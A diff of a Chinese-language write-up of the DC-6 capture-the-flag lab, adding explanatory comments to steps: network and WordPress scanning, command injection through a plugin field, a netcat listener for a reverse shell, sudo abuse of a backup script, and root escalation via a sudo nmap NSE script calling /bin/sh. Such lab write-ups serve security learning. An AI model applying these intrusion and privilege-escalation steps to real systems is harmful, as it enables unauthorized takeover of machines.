@@ -72,7 +72,6 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 5 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.896 seconds (135.02 hosts/sec). 4 responded
 
-┌──(kali㉿kali)-[~]
 ```
 
 ```DC6 IP
@@ -80,6 +79,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 1.896 seconds (135.02 hosts/sec). 4
 ```
 
 ### [[nmap]] 扫描
+先来看看都开放了哪些端口
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -116,7 +116,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Did not follow redirect to http://wordy/
 ```
 
-手工添加hosts
+手这次依然需要工添加hosts
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -125,13 +125,13 @@ Did not follow redirect to http://wordy/
 
 ![[dc6-vim.png]]
 
-接下来使用kali 浏览器访问
+接下来我们使用kali 浏览器访问
 
 ![[dc6-wp.png]]
 
-还是wordpress
+网站框架是wordpress
 
-使用wpscan 扫下看看
+那么使用wpscan 扫下看看
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -276,6 +276,8 @@ Interesting Finding(s):
  WordPress version 5.1.1 identified (Insecure, released on 2019-03-13)
 ```
 
+看其他师傅通过枚举插件，查插件漏洞进去的
+
 得到wordpress 版本
 
 ```shell
@@ -284,6 +286,7 @@ Interesting Finding(s):
 CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 ```
 
+这个版本信息貌似没什么用
 ### 尝试枚举用户名
 
 ```shell
@@ -390,15 +393,19 @@ dirb取得管理员url
 
 它可以反向解析主机，测试的IP地址是中国电信的DNS
 ![[Pasted image 20250621202208.png]]
+
 这里的输入框有限制，换个短的ip
+测试可以实现命令注入
+
 ![[Pasted image 20250621202230.png]]
 
+在kali开启
 ```shell
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvvp 2333
 ```
 
-抓包修改
+使用burp抓包修改
 
 ![[Pasted image 20250621203037.png]]
 
@@ -428,32 +435,35 @@ GSo7isUM1D4就是graham的密码
 无密码sudo的
 
 ![[Pasted image 20250621205054.png]]
+jens用户可以无密码sudo执行
 
-尝试使用vim编辑，vim没有安装
+尝试使用vim编辑，但是vim没有安装
 
 使用echo加重定向修改文件
 添加一行/bin/bash，尝试提权
+目的是以jens的身份运行shell
 
 ```shell
 graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
 ```
-
-![[Pasted image 20250621205347.png]]
-用户jens可以无密码使用该命令
-在sudo时指定用户
+以jens身份运行backups.sh
 
 现在是jens用户下了
+还是sudo -l 看一下
 
 ![[Pasted image 20250621205900.png]]
 这个用户可以无密码使用nmap
 
-新建一个脚本文件
+nmap提权
+让nmap运行/bin/bash
+
+新建一个nmap脚本文件
 
 ```shell
 jens@dc-6:~$ echo 'os.execute("/bin/sh")' > bash.nse
 ```
 
-为什么不是bash，用bash的话会出现无法交互的问题
+为什么不是bash，笔者在使用bash的时候出现了无法交互的问题，所以在这里使用了sh
 
 ```shell
 jens@dc-6:~$ sudo nmap --script=bash.nse
